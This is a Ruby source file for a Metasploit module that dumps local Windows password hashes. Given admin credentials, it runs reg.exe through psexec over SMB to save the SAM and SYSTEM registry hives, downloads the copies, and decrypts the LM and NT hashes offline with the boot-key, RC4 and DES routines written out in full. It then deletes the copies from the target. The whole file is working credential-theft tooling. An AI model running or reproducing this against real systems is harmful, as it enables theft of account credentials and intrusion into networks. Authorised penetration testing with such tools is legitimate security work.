##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex/registry'
require 'fileutils'
#require 'msf/core/exploit/psexec'

class Metasploit3 < Msf::Auxiliary

	# Exploit mixins should be called first
	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::SMB
	include Msf::Exploit::Remote::SMB::Psexec
	include Msf::Exploit::Remote::SMB::Authenticated
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner
	# Aliases for common classes
	SIMPLE = Rex::Proto::SMB::SimpleClient
	XCEPT = Rex::Proto::SMB::Exceptions
	CONST = Rex::Proto::SMB::Constants


	def initialize
		super(
			'Name'        => 'SMB - Grab Local User Hashes',
			'Description' => %Q{
				This module extracts local user account password hashes from the
				SAM and SYSTEM hive files by authenticating to the target machine and
				downloading a copy of the hives.  The hashes are extracted offline on
				the attacking machine.  This all happenes without popping a shell or uploading
				anything to the target machine.  Local Admin credentials (password -or- hash) are required
			},
			'Author'      =>
				[
					'Royce Davis <rdavis[at]accuvant.com>',    # @R3dy__
				],
			'References'  => [
				['URL', 'http://sourceforge.net/projects/smbexec/'],
				['URL', 'http://www.accuvant.com/blog/2012/11/13/owning-computers-without-shell-access']
			],
			'License'     => MSF_LICENSE
		)
		register_options([
			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
			OptString.new('LOGDIR', [true, 'This is a directory on your local attacking system used to store Hive files and hashes', '/tmp/msfhashes/local']),
			OptString.new('RPORT', [true, 'The Target port', 445]),
			OptString.new('WINPATH', [true, 'The name of the WINDOWS directory on the remote host', 'WINDOWS']),
		], self.class)
		deregister_options('RHOST')
	end


	def peer
		return "#{rhost}:#{rport}"
	end


	# This is the main controller function
	def run_host(ip)
		sampath = "\\#{datastore['WINPATH']}\\Temp\\#{Rex::Text.rand_text_alpha(20)}"
		syspath = "\\#{datastore['WINPATH']}\\Temp\\#{Rex::Text.rand_text_alpha(20)}"
		logdir = datastore['LOGDIR']
		hives = [sampath, syspath]
		@smbshare = datastore['SMBSHARE']
		@ip = ip
		if connect
			begin
				smb_login
			rescue StandardError => autherror
				print_error("#{peer} - #{autherror}")
				return
			end
			if save_reg_hives(sampath, syspath)
				d = download_hives(sampath, syspath, logdir)
				sys, sam = open_hives(logdir, hives)
				if d
					dump_creds(sam, sys)
				end
			end
			cleanup_after([sampath, syspath])
			disconnect
		end
	end


	# This method attempts to use reg.exe to generate copies of the SAM and SYSTEM, registry hives
	# and store them in the Windows Temp directory on the remote host
	def save_reg_hives(sampath, syspath)
		vprint_status("#{peer} - Creating hive copies.")
		begin
			# Try to save the hive files
			command = "%COMSPEC% /C reg.exe save HKLM\\SAM #{sampath} /y && reg.exe save HKLM\\SYSTEM #{syspath} /y"
			return psexec(command)
		rescue StandardError => saveerror
			print_error("#{peer} - Unable to create hive copies with reg.exe: #{saveerror}")
			return false
		end
	end


	# Method used to copy hive files from C:\WINDOWS\Temp* on the remote host
	# To the local file path specified in datastore['LOGDIR'] on attacking system
	def download_hives(sampath, syspath, logdir)
		vprint_status("#{peer} - Downloading SYSTEM and SAM hive files.")
		begin
			newdir = "#{logdir}/#{@ip}"
			::FileUtils.mkdir_p(newdir) unless ::File.exists?(newdir)
			simple.connect("\\\\#{@ip}\\#{@smbshare}")
			# Get contents of hive file
			remotesam = simple.open("#{sampath}", 'rob')
			remotesys = simple.open("#{syspath}", 'rob')
			samdata = remotesam.read
			sysdata = remotesys.read
			# Save it to local file system
			localsam = File.open("#{logdir}/#{@ip}/sam", "wb+")
			localsys = File.open("#{logdir}/#{@ip}/sys", "wb+")
			localsam.write(samdata)
			localsys.write(sysdata)
			localsam.close
			localsys.close
			remotesam.close
			remotesys.close
			simple.disconnect("\\\\#{@ip}\\#{@smbshare}")
			return true
		rescue StandardError => copyerror
			print_error("#{peer} - Unable to download hive copies from. #{copyerror}")
			simple.disconnect("\\\\#{@ip}\\#{@smbshare}")
			return nil
		end
	end


	# This method should open up a hive file from yoru local system and allow interacting with it
	def open_hives(path, hives)
		begin
			vprint_status("#{peer} - Opening hives from on local Attack system")
			sys = Rex::Registry::Hive.new("#{path}/#{@ip}/sys")
			sam = Rex::Registry::Hive.new("#{path}/#{@ip}/sam")
			return sys, sam
		rescue StandardError => openerror
			print_error("#{peer} - Unable to open hives.  May not have downloaded properly. #{openerror}")
			return nil, nil
		end
	end


	# Removes files created during execution.
	def cleanup_after(files)
		simple.connect("\\\\#{@ip}\\#{@smbshare}")
		vprint_status("#{peer} - Executing cleanup...")
		files.each do |file|
			begin
				if smb_file_exist?(file)
					smb_file_rm(file)
				end
			rescue Rex::Proto::SMB::Exceptions::ErrorCode => cleanuperror
				print_error("#{peer} - Unable to cleanup #{file}. Error: #{cleanuperror}")
			end
		end
		left = files.collect{ |f| smb_file_exist?(f) }
		if left.any?
			print_error("#{peer} - Unable to cleanup. Maybe you'll need to manually remove #{left.join(", ")} from the target.")
		else
			vprint_status("#{peer} - Cleanup was successful")
		end
		simple.disconnect("\\\\#{@ip}\\#{@smbshare}")
	end


	# This method was taken from tools/reg.rb  thanks bperry for all of your efforts!!
	def get_boot_key(hive)
		begin
			return if !hive.root_key
			return if !hive.root_key.name
			default_control_set = hive.value_query('\Select\Default').value.data.unpack("c").first
			bootkey = ""
			basekey = "\\ControlSet00#{default_control_set}\\Control\\Lsa"
			%W{JD Skew1 GBG Data}.each do |k|
				ok = hive.relative_query(basekey + "\\" + k)
				return nil if not ok
				tmp = ""
				0.upto(ok.class_name_length - 1) do |i|
					next if i%2 == 1
					tmp << ok.class_name_data[i,1]
				end
				bootkey << [tmp].pack("H*")
			end
			keybytes = bootkey.unpack("C*")
			p = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
			scrambled = ""
			p.each do |i|
				scrambled << bootkey[i]
			end
			return scrambled
		rescue StandardError => bootkeyerror
			print_error("#{peer} - Error ubtaining bootkey. #{bootkeyerror}")
			return bootkeyerror
		end
	end


	# More code from tools/reg.rb
	def get_hboot_key(sam, bootkey)
		num = "0123456789012345678901234567890123456789\0"
		qwerty = "!@#\$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"
		account_path = "\\SAM\\Domains\\Account"
		accounts = sam.relative_query(account_path)
		f = nil
		accounts.value_list.values.each do |value|
			if value.name == "F"
				f = value.value.data
			end
		end
		raise "Hive broken" if not f
		md5 = Digest::MD5.digest(f[0x70,0x10] + qwerty + bootkey + num)
		rc4 = OpenSSL::Cipher::Cipher.new('rc4')
		rc4.key = md5
		return rc4.update(f[0x80,0x20])
	end


	# Some of this taken from tools/reb.rb some of it is from hashdump.rb some of it is my own...
	def dump_creds(sam, sys)
		empty_lm = "aad3b435b51404eeaad3b435b51404ee"
		empty_nt = "31d6cfe0d16ae931b73c59d7e0c089c0"
		bootkey = get_boot_key(sys)
		hbootkey = get_hboot_key(sam, bootkey)
		print_status("#{peer} - Extracting hashes.")
		users = get_users(sam)
		usercount = users.size
		begin
			users.each do |user|
				if usercount == 1
					return
				end
				rid = user.name.to_i(16)
				hashes = get_user_hashes(user, hbootkey)
				obj = []
				obj << get_user_name(user)
				obj << ":"
				obj << rid
				obj << ":"
				if hashes[0].empty?
					hashes[0] = empty_lm
				else
					hashes[0] = hashes[0].unpack("H*")
				end
				if hashes[1].empty?
					hashes[1] = empty_nt
				else
					hashes[1] = hashes[1].unpack("H*")
				end
				obj << hashes[0]
				obj << ":"
				obj << hashes[1]
				obj << ":::"
				if obj.length > 0
					report_creds(obj.join)
				else
					print_status("#{peer} No local user hashes.  System is likely a DC")
				end
				usercount = usercount - 1
			end
		rescue StandardError => dumpcreds
			return
		end
	end


	# Report to the database
	def report_creds(hash)
		print_good("#{hash}")
		creds_entry = {
			:rhost => rhost,
			:username => hash.split(":")[0],
			:userid => hash.split(":")[1],
			:hash => hash.split(":")[2] + ":" + hash.split(":")[3]
		}
		report_auth_info(creds_entry)
	end


	# Method extracts usernames from user keys, modeled after credddump
	def get_user_name(user_key)
		v = ""
		user_key.value_list.values.each do |value|
			v << value.value.data if value.name == "V"
		end
		name_offset = v[0x0c, 0x10].unpack("<L")[0] + 0xCC
		name_length = v[0x10, 0x1c].unpack("<L")[0]
		return v[name_offset, name_length]
	end


	# More code from tools/reg.rb
	def get_users(sam_hive)
		begin
			# Get users from SAM hive
			users = []
			sam_hive.relative_query('\SAM\Domains\Account\Users').lf_record.children.each do |user_key|
				users << user_key unless user_key.name == "Names"
			end
		rescue StandardError => getuserserror
			print_error("#{peer} - Unable to retrieve users from SAM hive. Method get_users. #{getuserserror}")
			return getuserserror
		end
	end


	# More code from tools/reg.rb
	def get_user_hashes(user_key, hbootkey)
		rid = user_key.name.to_i(16)
		v = nil
		user_key.value_list.values.each do |value|
			v = value.value.data if value.name == "V"
		end
		hash_offset = v[0x9c, 4].unpack("<L")[0] + 0xCC
		lm_exists = (v[0x9c+4, 4].unpack("<L")[0] == 20 ? true : false)
		nt_exists = (v[0x9c+16, 4].unpack("<L")[0] == 20 ? true : false)
		lm_hash = v[hash_offset + 4, 16] if lm_exists
		nt_hash = v[hash_offset + (lm_exists ? 24 : 8), 16] if nt_exists
		return decrypt_hashes(rid, lm_hash || nil, nt_hash || nil, hbootkey)
	end


	# More code from tools/reg.rb
	def decrypt_hashes(rid, lm_hash, nt_hash, hbootkey)
		ntpwd = "NTPASSWORD\0"
		lmpwd = "LMPASSWORD\0"
		begin
			# Try to decrypt hashes
			hashes = []
			if lm_hash
				hashes << decrypt_hash(rid, hbootkey, lm_hash, lmpwd)
			else
				hashes << ""
			end
			if nt_hash
				hashes << decrypt_hash(rid, hbootkey, nt_hash, ntpwd)
			else
				hashes << ""
			end
			return hashes
		rescue StandardError => decrypthasherror
			print_error("#{peer} - Unable to decrypt hashes. Method: decrypt_hashes. #{decrypthasherror}")
			return decrypthasherror
		end
	end


	# This code is taken straight from hashdump.rb
	# I added some comments for newbs like me to benefit from
	def decrypt_hash(rid, hbootkey, enchash, pass)
		begin
			# Create two des encryption keys
			des_k1, des_k2 = sid_to_key(rid)
			d1 = OpenSSL::Cipher::Cipher.new('des-ecb')
			d1.padding = 0
			d1.key = des_k1
			d2 = OpenSSL::Cipher::Cipher.new('des-ecb')
			d2.padding = 0
			d2.key = des_k2
			#Create MD5 Digest
			md5 = Digest::MD5.new
			#Decrypt value from hbootkey using md5 digest
			md5.update(hbootkey[0,16] + [rid].pack("V") + pass)
			#create rc4 encryption key using md5 digest
			rc4 = OpenSSL::Cipher::Cipher.new('rc4')
			rc4.key = md5.digest
			#Run rc4 decryption of the hash
			okey = rc4.update(enchash)
			#Use 1st des key to decrypt first 8 bytes of hash
			d1o  = d1.decrypt.update(okey[0,8])
			d1o << d1.final
			# Use second des key to decrypt second 8 bytes of hash
			d2o  = d2.decrypt.update(okey[8,8])
			d1o << d2.final
			value = d1o + d2o
			return value
		rescue StandardError => desdecrypt
			print_error("#{peer} - Error while decrypting with DES. #{desdecrypt}")
			return desdecrypt
		end
	end


	# More code from tools/reg.rb
	def sid_to_key(sid)
		s1 = ""
		s1 << (sid & 0xFF).chr
		s1 << ((sid >> 8) & 0xFF).chr
		s1 << ((sid >> 16) & 0xFF).chr
		s1 << ((sid >> 24) & 0xFF).chr
		s1 << s1[0]
		s1 << s1[1]
		s1 << s1[2]
		s2 = s1[3] + s1[0] + s1[1] + s1[2]
		s2 << s2[0] + s2[1] + s2[2]
		return string_to_key(s1), string_to_key(s2)
	end


	# More code from tools/reg.rb
	def string_to_key(s)
		parity = [
			1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
			16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
			32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
			49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
			64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
			81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
			97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
			112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
			128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
			145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
			161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
			176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
			193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
			208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
			224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
			241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
		]
		key = []
		key << (s[0].unpack('C')[0] >> 1)
		key << ( ((s[0].unpack('C')[0]&0x01)<<6) | (s[1].unpack('C')[0]>>2) )
		key << ( ((s[1].unpack('C')[0]&0x03)<<5) | (s[2].unpack('C')[0]>>3) )
		key << ( ((s[2].unpack('C')[0]&0x07)<<4) | (s[3].unpack('C')[0]>>4) )
		key << ( ((s[3].unpack('C')[0]&0x0F)<<3) | (s[4].unpack('C')[0]>>5) )
		key << ( ((s[4].unpack('C')[0]&0x1F)<<2) | (s[5].unpack('C')[0]>>6) )
		key << ( ((s[5].unpack('C')[0]&0x3F)<<1) | (s[6].unpack('C')[0]>>7) )
		key << ( s[6].unpack('C')[0]&0x7F)
		0.upto(7).each do |i|
			key[i] = (key[i]<<1)
			key[i] = parity[key[i]]
		end
		return key.pack("<C*")
	end

end
